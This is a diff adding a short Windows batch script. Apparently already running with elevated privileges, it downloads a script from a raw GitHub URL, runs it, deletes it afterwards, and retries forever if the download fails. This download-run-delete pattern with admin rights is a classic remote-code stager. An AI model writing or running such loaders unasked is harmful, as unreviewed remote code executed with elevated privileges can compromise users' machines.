@@ -1,0 +1,30 @@
+@echo off
+
+
+
+
+::RUNADMINHERE ( Is Running with Elevated  Privileges , because this file is called by elevated batch file )
+
+
+
+
+
+color 0A
+setlocal enabledelayedexpansion
+set "embeddedScript=temp_script_LAPTOPRUN.bat"
+
+
+
+:LAPTOPRUN
+:: Download content and save to the embedded batch file
+powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Codes/LAPTOPRUN') | Out-File -Encoding ASCII '%embeddedScript%'"
+
+if exist "%embeddedScript%" (
+    call "%embeddedScript%"
+    del "%embeddedScript%" >nul 2>&1
+) else (
+    echo Filed to get content from LAPTOPRUN Link
+    echo.
+    timeout /t 2 /nobreak >nul
+    goto LAPTOPRUN
+)
